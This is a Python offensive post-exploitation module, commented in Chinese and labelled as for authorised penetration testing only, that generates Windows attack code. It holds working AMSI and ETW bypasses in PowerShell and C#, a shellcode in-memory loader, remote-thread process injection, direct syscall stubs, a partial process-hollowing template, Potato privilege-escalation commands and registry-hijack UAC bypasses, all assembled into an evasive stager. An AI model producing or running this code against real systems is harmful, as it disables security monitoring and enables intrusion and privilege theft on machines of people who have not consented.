#!/usr/bin/env python3
"""
高级后渗透模块 - Advanced Post-Exploitation Module
功能: AMSI绕过、内存执行、EDR规避、高级提权、进程注入
仅用于授权渗透测试
"""

import base64
import hashlib
import logging
import random
import string
import struct
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class ExecutionMethod(Enum):
    """执行方法"""

    DISK_DROP = "disk"
    MEMORY_ONLY = "memory"
    REFLECTIVE_DLL = "reflective"
    PROCESS_HOLLOW = "hollow"
    THREAD_INJECTION = "thread"


class AMSIBypassTechnique(Enum):
    """AMSI绕过技术"""

    PATCH_AMSI_SCAN = "patch_scan"
    PATCH_AMSI_INIT = "patch_init"
    HARDWARE_BREAKPOINT = "hw_bp"
    REFLECTION = "reflection"
    MEMORY_PATCH = "mem_patch"
    STRING_OBFUSCATION = "string_obfs"


class EDRBypassTechnique(Enum):
    """EDR绕过技术"""

    DIRECT_SYSCALL = "syscall"
    UNHOOK_NTDLL = "unhook"
    CALLBACK_REMOVAL = "callback"
    ETW_PATCH = "etw"
    PPL_BYPASS = "ppl"


@dataclass
class ExecutionResult:
    """执行结果"""

    success: bool
    method: ExecutionMethod
    output: str = ""
    error: str = ""
    pid: int = 0
    evidence: Dict[str, Any] = field(default_factory=dict)


class AMSIBypass:
    """
    AMSI绕过模块

    Windows反恶意软件扫描接口绕过技术
    """

    # PowerShell AMSI绕过（混淆版本）
    PS_BYPASS_TEMPLATES: Dict[str, str] = {
        # 方法1: 经典patch（混淆）
        "patch_classic": """
$a=[Ref].Assembly.GetTypes()|%{if($_.Name -like "*iUtils"){$_}};
$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};
[IntPtr]$c=$b.GetValue($null);
[Int32[]]$d=@(0);
[System.Runtime.InteropServices.Marshal]::Copy($d,0,$c,1)
""",
        # 方法2: 反射修改
        "reflection": """
$w = 'System.Management.Automation.A]s]iUtils'.Replace(']','m');
$t = [Ref].Assembly.GetType($w);
$f = $t.GetField('a]s]iInitFailed'.Replace(']','m'),'NonPublic,Static');
$f.SetValue($null,$true)
""",
        # 方法3: 使用Base64混淆
        "base64_obfs": """
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(
'U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))
).GetField([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(
'YW1zaUNvbnRleHQ=')),'NonPublic,Static').GetValue($null),0x41414141)
""",
        # 方法4: 强制加载失败
        "force_error": """
$m = [Runtime.InteropServices.Marshal];
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$m::WriteInt32($a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0)
""",
    }

    # C# AMSI绕过代码
    CSHARP_BYPASS = """
using System;
using System.Runtime.InteropServices;

public class Bypass {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    public static void Run() {
        IntPtr lib = LoadLibrary("a]s]i.dll".Replace("]", "m"));
        IntPtr addr = GetProcAddress(lib, "A]s]iScanBuffer".Replace("]", "m"));
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, addr, 6);
        VirtualProtect(addr, (UIntPtr)5, oldProtect, out oldProtect);
    }
}
"""

    @classmethod
    def get_powershell_bypass(
        cls, technique: AMSIBypassTechnique = None, obfuscate: bool = True
    ) -> str:
        """获取PowerShell AMSI绕过代码"""
        if technique == AMSIBypassTechnique.PATCH_AMSI_SCAN:
            bypass = cls.PS_BYPASS_TEMPLATES["patch_classic"]
        elif technique == AMSIBypassTechnique.REFLECTION:
            bypass = cls.PS_BYPASS_TEMPLATES["reflection"]
        elif technique == AMSIBypassTechnique.STRING_OBFUSCATION:
            bypass = cls.PS_BYPASS_TEMPLATES["base64_obfs"]
        else:
            # 随机选择
            bypass = random.choice(list(cls.PS_BYPASS_TEMPLATES.values()))

        if obfuscate:
            bypass = cls._obfuscate_powershell(bypass)

        return bypass

    @classmethod
    def _obfuscate_powershell(cls, code: str) -> str:
        """混淆PowerShell代码"""
        # 移除注释和多余空白
        lines = [
            line.strip()
            for line in code.split("\n")
            if line.strip() and not line.strip().startswith("#")
        ]
        code = ";".join(lines)

        # 随机变量名替换
        var_map = {}
        new_code = code
        for var in ["$a", "$b", "$c", "$d", "$w", "$t", "$f", "$m"]:
            if var in new_code:
                new_var = "$" + "".join(
                    random.choices(string.ascii_lowercase, k=random.randint(3, 8))
                )
                var_map[var] = new_var
                new_code = new_code.replace(var, new_var)

        # 字符串混淆
        new_code = cls._obfuscate_strings(new_code)

        return new_code

    @classmethod
    def _obfuscate_strings(cls, code: str) -> str:
        """混淆代码中的字符串"""
        import re

        def replace_string(match):
            s = match.group(1)
            if len(s) < 3 or len(s) > 50:
                return match.group(0)
            # 使用字符数组连接
            chars = "+".join([f"[char]{ord(c)}" for c in s])
            return f"({chars})"

        # 替换简单字符串（谨慎操作）
        # 这里只做简单演示，实际需要更复杂的解析
        return code

    @classmethod
    def generate_one_liner(cls) -> str:
        """生成一行式AMSI绕过"""
        bypass = cls.get_powershell_bypass(AMSIBypassTechnique.REFLECTION, obfuscate=True)
        # 编码为Base64
        encoded = base64.b64encode(bypass.encode("utf-16-le")).decode()
        return f"powershell -enc {encoded}"


class ETWBypass:
    """ETW绕过模块"""

    # PowerShell ETW patch
    PS_ETW_BYPASS = """
$etw = [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance');
$etwNt = [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider');
$eventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid());
$etw.SetValue($eventProvider, 0);
"""

    # C# ETW patch
    CSHARP_ETW_BYPASS = """
using System;
using System.Runtime.InteropServices;

public class ETW {
    [DllImport("ntdll.dll")]
    static extern int EtwEventWrite(long handle, ref Guid eventDescriptor, int dataCount, IntPtr userData);
    
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    public static void Patch() {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr addr = GetProcAddress(ntdll, "EtwEventWrite");
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)1, 0x40, out oldProtect);
        Marshal.WriteByte(addr, 0xC3);  // ret
        VirtualProtect(addr, (UIntPtr)1, oldProtect, out oldProtect);
    }
}
"""


class MemoryExecution:
    """
    内存执行模块

    实现无文件执行技术
    """

    @staticmethod
    def generate_reflective_loader(shellcode: bytes, target_arch: str = "x64") -> str:
        """生成反射加载器PowerShell代码"""
        encoded = base64.b64encode(shellcode).decode()

        if target_arch == "x64":
            loader = f"""
$code = [Convert]::FromBase64String("{encoded}")
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($code.Length)
[System.Runtime.InteropServices.Marshal]::Copy($code, 0, $mem, $code.Length)

$callback = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $mem,
    (Invoke-Expression '[Func[IntPtr]]')
)
$callback.Invoke() | Out-Null
"""
        else:
            loader = f"""
$code = [Convert]::FromBase64String("{encoded}")
[System.Reflection.Assembly]::Load($code).EntryPoint.Invoke($null, @(,[string[]]@()))
"""

        return loader

    @staticmethod
    def generate_process_injection_code(
        target_process: str = "explorer.exe", shellcode: bytes = None
    ) -> str:
        """生成进程注入代码"""
        if shellcode:
            encoded_sc = base64.b64encode(shellcode).decode()
        else:
            encoded_sc = "PLACEHOLDER_SHELLCODE_BASE64"

        code = f"""
$code = [Convert]::FromBase64String("{encoded_sc}")

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Inject {{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}}
"@

$proc = Get-Process -Name "{target_process}" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($proc) {{
    $handle = [Inject]::OpenProcess(0x001F0FFF, $false, $proc.Id)
    $addr = [Inject]::VirtualAllocEx($handle, [IntPtr]::Zero, [uint32]$code.Length, 0x3000, 0x40)
    $out = [IntPtr]::Zero
    [Inject]::WriteProcessMemory($handle, $addr, $code, [uint32]$code.Length, [ref]$out)
    [Inject]::CreateRemoteThread($handle, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
}}
"""
        return code


class DirectSyscall:
    """
    直接系统调用模块

    绕过用户态hook
    """

    # 系统调用号（Windows 10 21H2）
    SYSCALL_NUMBERS: Dict[str, Dict[str, int]] = {
        "NtAllocateVirtualMemory": {"win10_21h2": 0x18, "win11": 0x18},
        "NtWriteVirtualMemory": {"win10_21h2": 0x3A, "win11": 0x3A},
        "NtCreateThreadEx": {"win10_21h2": 0xC1, "win11": 0xC2},
        "NtProtectVirtualMemory": {"win10_21h2": 0x50, "win11": 0x50},
        "NtOpenProcess": {"win10_21h2": 0x26, "win11": 0x26},
    }

    @classmethod
    def generate_syscall_stub(cls, function_name: str, os_version: str = "win10_21h2") -> bytes:
        """生成系统调用stub"""
        if function_name not in cls.SYSCALL_NUMBERS:
            raise ValueError(f"Unknown syscall: {function_name}")

        syscall_num = cls.SYSCALL_NUMBERS[function_name].get(os_version, 0)

        # x64 syscall stub
        stub = bytes(
            [
                0x4C,
                0x8B,
                0xD1,  # mov r10, rcx
                0xB8,
                syscall_num & 0xFF,  # mov eax, syscall_number (low byte)
                (syscall_num >> 8) & 0xFF,
                0x00,
                0x00,
                0x0F,
                0x05,  # syscall
                0xC3,  # ret
            ]
        )

        return stub


class ProcessHollowing:
    """
    进程挖空技术

    在合法进程中执行payload
    """

    # C# 进程挖空代码框架
    CSHARP_TEMPLATE = """
using System;
using System.Runtime.InteropServices;

public class Hollow {
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    static extern int ZwUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);
    
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize;
        public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute;
        public uint dwFlags; public short wShowWindow; public short cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
    }
    
    public static void Run(byte[] payload, string targetPath) {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi;
        si.cb = (uint)Marshal.SizeOf(si);
        
        // CREATE_SUSPENDED = 0x4
        CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
        
        // 后续步骤: Unmap, 分配内存, 写入payload, 修改入口点, Resume
    }
}
"""


class AdvancedPrivesc:
    """
    高级提权技术
    """

    # Potato提权家族
    POTATO_VARIANTS: Dict[str, Dict[str, Any]] = {
        "juicy_potato": {
            "description": "JuicyPotato - SeImpersonatePrivilege提权",
            "requirements": ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"],
            "clsid_examples": [
                "{4991d34b-80a1-4291-83b6-3328366b9097}",  # BITS
                "{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}",  # Schedule
            ],
            "command": "JuicyPotato.exe -l {port} -p {cmd} -t * -c {clsid}",
        },
        "rogue_potato": {
            "description": "RoguePotato - 无BITS依赖",
            "requirements": ["SeImpersonatePrivilege"],
            "command": "RoguePotato.exe -r {remote_ip} -e {cmd}",
        },
        "sweet_potato": {
            "description": "SweetPotato - 多种CLSID利用",
            "requirements": ["SeImpersonatePrivilege"],
            "command": "SweetPotato.exe -p {cmd}",
        },
        "god_potato": {
            "description": "GodPotato - 通用Potato",
            "requirements": ["SeImpersonatePrivilege"],
            "command": "GodPotato.exe -cmd {cmd}",
        },
        "print_spoofer": {
            "description": "PrintSpoofer - Print Spooler利用",
            "requirements": ["SeImpersonatePrivilege"],
            "command": "PrintSpoofer.exe -c {cmd}",
        },
    }

    # UAC绕过技术
    UAC_BYPASSES: Dict[str, Dict[str, Any]] = {
        "fodhelper": {
            "description": "通过fodhelper.exe绕过UAC",
            "registry_key": r"HKCU\Software\Classes\ms-settings\shell\open\command",
            "auto_elevate": True,
            "code": r"""
$cmd = "{payload}"
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value $cmd -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Start-Sleep 2
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
""",
        },
        "computerdefaults": {
            "description": "通过computerdefaults.exe绕过UAC",
            "registry_key": r"HKCU\Software\Classes\ms-settings\shell\open\command",
            "code": r"""
$cmd = "{payload}"
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value $cmd -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe" -WindowStyle Hidden
""",
        },
        "eventvwr": {
            "description": "通过eventvwr.exe绕过UAC",
            "registry_key": r"HKCU\Software\Classes\mscfile\shell\open\command",
            "code": r"""
$cmd = "{payload}"
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value $cmd -Force
Start-Process "C:\Windows\System32\eventvwr.exe" -WindowStyle Hidden
""",
        },
        "sdclt": {
            "description": "通过sdclt.exe绕过UAC",
            "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe",
            "code": r"""
$cmd = "{payload}"
New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Name "(default)" -Value $cmd -Force
Start-Process "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden
""",
        },
        "cmstp": {
            "description": "通过CMSTP绕过UAC",
            "code": r"""
$inf = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5
[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection
[UnRegisterOCXSection]
{payload},NTXReg,
[Strings]
"@
$infPath = "$env:TEMP\evil.inf"
$inf | Out-File $infPath -Encoding ASCII
Start-Process "cmstp.exe" -ArgumentList "/au $infPath" -WindowStyle Hidden
""",
        },
    }

    @classmethod
    def get_uac_bypass(cls, method: str, payload: str) -> str:
        """获取UAC绕过代码"""
        if method not in cls.UAC_BYPASSES:
            # 默认使用fodhelper
            method = "fodhelper"

        bypass = cls.UAC_BYPASSES[method]
        code = bypass["code"].replace("{payload}", payload)
        return code

    @classmethod
    def get_potato_command(cls, variant: str, **kwargs) -> str:
        """获取Potato命令"""
        if variant not in cls.POTATO_VARIANTS:
            variant = "god_potato"

        potato = cls.POTATO_VARIANTS[variant]
        cmd = potato["command"]

        for key, value in kwargs.items():
            cmd = cmd.replace("{" + key + "}", str(value))

        return cmd


class PostExploitManager:
    """
    后渗透管理器

    整合所有后渗透能力
    """

    def __init__(self):
        self.amsi_bypass = AMSIBypass()
        self.etw_bypass = ETWBypass()
        self.memory_exec = MemoryExecution()
        self.syscall = DirectSyscall()
        self.privesc = AdvancedPrivesc()

    def generate_stager(
        self,
        payload_type: str = "powershell",
        include_amsi_bypass: bool = True,
        include_etw_bypass: bool = True,
    ) -> str:
        """
        生成stager代码

        Args:
            payload_type: powershell/csharp
            include_amsi_bypass: 是否包含AMSI绕过
            include_etw_bypass: 是否包含ETW绕过
        """
        stager_parts = []

        if payload_type == "powershell":
            if include_amsi_bypass:
                stager_parts.append(f"# AMSI Bypass\n{self.amsi_bypass.get_powershell_bypass()}")

            if include_etw_bypass:
                stager_parts.append(f"# ETW Bypass\n{ETWBypass.PS_ETW_BYPASS}")

            # 主payload占位符
            stager_parts.append("# Main Payload\n# INSERT_PAYLOAD_HERE")

        return "\n\n".join(stager_parts)

    def get_evasion_chain(self, target_os: str = "windows") -> List[Dict[str, Any]]:
        """
        获取推荐的规避链
        """
        if target_os == "windows":
            return [
                {"step": 1, "name": "AMSI Bypass", "technique": "reflection", "mandatory": True},
                {"step": 2, "name": "ETW Patch", "technique": "mem_patch", "mandatory": False},
                {"step": 3, "name": "Unhook NTDLL", "technique": "fresh_copy", "mandatory": False},
                {
                    "step": 4,
                    "name": "Memory Execution",
                    "technique": "reflective",
                    "mandatory": True,
                },
            ]
        else:
            return [
                {
                    "step": 1,
                    "name": "LD_PRELOAD Bypass",
                    "technique": "unset_preload",
                    "mandatory": False,
                },
                {"step": 2, "name": "Disable ASLR", "technique": "ulimit", "mandatory": False},
                {"step": 3, "name": "Memory Execution", "technique": "memfd", "mandatory": True},
            ]

    def suggest_privesc(
        self, current_privileges: List[str], target_os: str = "windows"
    ) -> List[Dict[str, Any]]:
        """
        根据当前权限建议提权方法
        """
        suggestions = []

        if target_os == "windows":
            if "SeImpersonatePrivilege" in current_privileges:
                suggestions.append(
                    {
                        "method": "Potato Family",
                        "variants": list(self.privesc.POTATO_VARIANTS.keys()),
                        "priority": "high",
                        "success_rate": 0.9,
                    }
                )

            if "SeDebugPrivilege" in current_privileges:
                suggestions.append(
                    {
                        "method": "Process Token Stealing",
                        "technique": "token_impersonation",
                        "priority": "high",
                        "success_rate": 0.85,
                    }
                )

            # UAC绕过总是可用
            suggestions.append(
                {
                    "method": "UAC Bypass",
                    "variants": list(self.privesc.UAC_BYPASSES.keys()),
                    "priority": "medium",
                    "success_rate": 0.7,
                }
            )

        return suggestions


# 便捷函数
def get_amsi_bypass(technique: str = None) -> str:
    """获取AMSI绕过代码"""
    tech = AMSIBypassTechnique(technique) if technique else None
    return AMSIBypass.get_powershell_bypass(tech)


def get_uac_bypass(method: str, payload: str) -> str:
    """获取UAC绕过代码"""
    return AdvancedPrivesc.get_uac_bypass(method, payload)


def get_potato_command(variant: str, **kwargs) -> str:
    """获取Potato命令"""
    return AdvancedPrivesc.get_potato_command(variant, **kwargs)
